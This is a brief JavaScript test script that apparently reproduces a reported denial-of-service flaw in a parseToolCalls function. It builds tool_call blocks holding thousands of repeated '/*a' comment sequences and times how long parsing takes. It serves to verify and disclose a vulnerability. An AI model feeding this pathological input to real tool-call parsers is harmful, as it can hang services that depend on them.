// Test the exact trigger scenario from the claim
import { parseToolCalls } from './dist/index.js';

// Create a malicious tool_call block
function createToolCallBlock(count) {
  // Build the malicious pattern inside the arguments
  const commentSeq = Array(count).fill('/*a').join('');
  return `\`\`\`tool_call
{"name":"test","arguments":{"x":"${commentSeq}"}}
\`\`\``;
}

console.log('Testing exact trigger: tool_call block with malformed JSON\n');
console.log('Count\tTime(ms)');

const counts = [1000, 2000, 5000, 10000];

for (const count of counts) {
  const block = createToolCallBlock(count);
  
  const start = process.hrtime.bigint();
  const result = parseToolCalls(block);
  const end = process.hrtime.bigint();
  
  const duration = Number(end - start) / 1e6;
  console.log(`${count}\t${duration.toFixed(2)}`);
  
  if (duration > 30000) {
    console.log('Exceeded 30 seconds - stopping');
    break;
  }
}
